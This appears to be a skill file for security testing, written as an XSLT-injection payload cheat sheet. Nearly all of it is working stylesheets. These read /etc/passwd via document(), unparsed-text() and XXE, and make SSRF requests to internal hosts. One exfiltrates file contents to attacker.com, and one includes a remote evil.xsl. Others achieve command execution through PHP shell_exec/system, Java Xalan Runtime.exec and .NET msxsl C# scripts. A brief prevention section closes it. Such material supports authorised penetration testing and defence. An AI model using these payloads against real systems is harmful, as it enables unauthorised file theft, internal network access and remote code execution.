---
name: xslt
description: XSLT injection for file read, SSRF, and RCE. Use when testing XSLT transformations.
---

# XSLT Injection

## Description
XSLT (Extensible Stylesheet Language Transformations) Injection occurs when user-controlled input is incorporated into XSLT stylesheets without proper validation. This can lead to information disclosure, SSRF, and remote code execution depending on the XSLT processor.

## XSLT Basics

### XSLT Structure
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <html>
            <body>
                <xsl:value-of select="/root/element"/>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

### Common XSLT Processors
- **Xalan** (Java)
- **Saxon** (Java/.NET)
- **libxslt** (C/Python/PHP)
- **MSXML** (.NET)

## Information Disclosure

### Read Local Files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="document('/etc/passwd')"/>
    </xsl:template>
</xsl:stylesheet>
```

### Using unparsed-text() (XSLT 2.0)
```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="unparsed-text('/etc/passwd')"/>
    </xsl:template>
</xsl:stylesheet>
```

### System Information
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <output>
            <vendor><xsl:value-of select="system-property('xsl:vendor')"/></vendor>
            <version><xsl:value-of select="system-property('xsl:version')"/></version>
            <url><xsl:value-of select="system-property('xsl:vendor-url')"/></url>
        </output>
    </xsl:template>
</xsl:stylesheet>
```

## Server-Side Request Forgery (SSRF)

### Using document()
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="document('http://internal-server/secret')"/>
    </xsl:template>
</xsl:stylesheet>
```

### Data Exfiltration via SSRF
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:variable name="secret" select="document('/etc/passwd')"/>
        <xsl:value-of select="document(concat('http://attacker.com/?data=', $secret))"/>
    </xsl:template>
</xsl:stylesheet>
```

## XXE via XSLT

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        &xxe;
    </xsl:template>
</xsl:stylesheet>
```

## Remote Code Execution

### PHP (libxslt + registerPHPFunctions)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
    <xsl:template match="/">
        <xsl:value-of select="php:function('file_get_contents', '/etc/passwd')"/>
    </xsl:template>
</xsl:stylesheet>
```

#### PHP Command Execution
```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
    <xsl:template match="/">
        <xsl:value-of select="php:function('shell_exec', 'id')"/>
    </xsl:template>
</xsl:stylesheet>
```

#### PHP Assert RCE
```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
    <xsl:template match="/">
        <xsl:value-of select="php:function('assert', 'system(\"id\")')"/>
    </xsl:template>
</xsl:stylesheet>
```

### Java (Xalan)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
        <xsl:variable name="rtobject" select="rt:getRuntime()"/>
        <xsl:variable name="process" select="rt:exec($rtobject,'id')"/>
        <xsl:variable name="stream" select="ob:getInputStream($process)"/>
        <xsl:value-of select="$stream"/>
    </xsl:template>
</xsl:stylesheet>
```

### .NET (MSXSL)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:user="http://mycompany.com/mynamespace">
    <msxsl:script language="C#" implements-prefix="user">
        <![CDATA[
        public string execute(){
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c whoami";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            return proc.StandardOutput.ReadToEnd();
        }
        ]]>
    </msxsl:script>
    <xsl:template match="/">
        <xsl:value-of select="user:execute()"/>
    </xsl:template>
</xsl:stylesheet>
```

## Detection

### Identify XSLT Processing
```
- Look for XML transformation endpoints
- Check for file upload accepting .xsl/.xslt
- Look for parameters controlling transformation
```

### Test for Information Disclosure
```xml
<!-- Check XSLT version and vendor -->
<xsl:value-of select="system-property('xsl:vendor')"/>
```

### Test for File Read
```xml
<xsl:value-of select="document('/etc/passwd')"/>
<xsl:copy-of select="document('file:///etc/passwd')"/>
```

## Payloads Summary

### Information Disclosure
```xml
<!-- System properties -->
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:version')"/>

<!-- File read -->
<xsl:value-of select="document('/etc/passwd')"/>
<xsl:value-of select="unparsed-text('/etc/passwd')"/>
```

### SSRF
```xml
<xsl:value-of select="document('http://internal:8080/admin')"/>
<xsl:include href="http://attacker.com/evil.xsl"/>
```

### RCE (PHP)
```xml
<xsl:value-of select="php:function('system', 'id')"/>
```

### RCE (Java)
```xml
<xsl:variable name="rt" select="rt:getRuntime()"/>
<xsl:variable name="proc" select="rt:exec($rt, 'id')"/>
```

## Testing Checklist

- [ ] Identify XSLT processing points
- [ ] Test system-property() for info disclosure
- [ ] Test document() for file read
- [ ] Test document() for SSRF
- [ ] Test XXE via DTD
- [ ] Test PHP function calls (if PHP backend)
- [ ] Test Java runtime execution (if Java backend)
- [ ] Test .NET script execution (if .NET backend)

## Prevention

```xml
<!-- Disable external entities -->
<!-- Disable extension functions -->
<!-- Use secure XSLT processor configuration -->

<!-- PHP: Don't register PHP functions -->
$xslt->registerPHPFunctions([]); // Empty array = no functions

<!-- Java: Disable extensions -->
TransformerFactory factory = TransformerFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

<!-- .NET: Disable scripting -->
XsltSettings settings = new XsltSettings(false, false); // disable scripts
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection
- https://blog.huntr.dev/write-ups/xslt-injection/
- https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection
